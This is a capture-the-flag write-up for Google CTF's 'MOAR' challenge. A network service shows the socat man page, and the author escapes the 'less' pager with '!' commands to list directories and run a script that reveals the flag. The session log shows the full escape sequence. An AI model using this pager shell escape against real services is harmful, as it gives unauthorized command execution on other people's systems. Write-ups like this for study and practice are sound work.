# MOAR
PWN

## Description:
> Finding yourself on the Foobanizer9000, a computer built by 9000 foos, this computer is so complicated luckily it serves manual pages through a network service. As the old saying goes, everything you need is in the manual.
> 
> nc moar.ctfcompetition.com 1337

## Solution:

Connecting to the provided server greets us with the man page for `socat`.
```
root@kali:/media/sf_CTFs/google/moar# nc moar.ctfcompetition.com 1337
socat(1)                                                              socat(1)

NAME
       socat - Multipurpose relay (SOcket CAT)

SYNOPSIS
       socat [options] <address> <address>
       socat -V
       socat -h[h[h]] | -?[?[?]]
       filan
       procan

DESCRIPTION
       Socat  is  a  command  line based utility that establishes two bidirec-
       tional byte streams  and  transfers  data  between  them.  Because  the
       streams  can be constructed from a large set of different types of data
       sinks and sources (see address types),  and  because  lots  of  address
       options  may be applied to the streams, socat can be used for many dif-
       ferent purposes.

       Filan is a utility  that  prints  information  about  its  active  file
       descriptors  to  stdout.  It  has been written for debugging socat, but
       might be useful for other purposes too. Use the -h option to find  more
 Manual page socat(1) line 1 (press h for help or q to quit)
```

[`man`](https://linux.die.net/man/1/man) uses [`less`](https://linux.die.net/man/1/less) to display the manual page, and `less` can trigger shell commands using the exclamation mark syntax:
>! shell-command
>
>    Invokes a shell to run the shell-command given. A percent sign (%) in the command is replaced by the name of the current file. A pound sign (#) is replaced by the name of the previously examined file. "!!" repeats the last shell command. "!" with no shell command simply invokes a shell. On Unix systems, the shell is taken from the environment variable SHELL, or defaults to "sh". On MS-DOS and OS/2 systems, the shell is the normal command processor. 

Using this, we can easily access the flag:

```
root@kali:/media/sf_CTFs/google/moar# nc moar.ctfcompetition.com 1337
socat(1)                                                              socat(1)

NAME
       socat - Multipurpose relay (SOcket CAT)

SYNOPSIS
       socat [options] <address> <address>
       socat -V
       socat -h[h[h]] | -?[?[?]]
       filan
       procan

DESCRIPTION
       Socat  is  a  command  line based utility that establishes two bidirec-
       tional byte streams  and  transfers  data  between  them.  Because  the
       streams  can be constructed from a large set of different types of data
       sinks and sources (see address types),  and  because  lots  of  address
       options  may be applied to the streams, socat can be used for many dif-
       ferent purposes.

       Filan is a utility  that  prints  information  about  its  active  file
       descriptors  to  stdout.  It  has been written for debugging socat, but
       might be useful for other purposes too. Use the -h option to find  more
 Manual page socat(1) line 1 (press h for help or q to quit)!ls
!ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
!done  (press RETURN)!ls home

!ls home
moar
!done  (press RETURN)!ls /home/moar

!ls /home/moar
disable_dmz.sh
!done  (press RETURN)!/home/moar/disable_dmz.sh

!/home/moar/disable_dmz.sh
Disabling DMZ using password CTF{SOmething-CATastr0phic}
/home/moar/disable_dmz.sh: 18: /home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system
!done  (press RETURN)root@kali:/media/sf_CTFs/google/moar#
```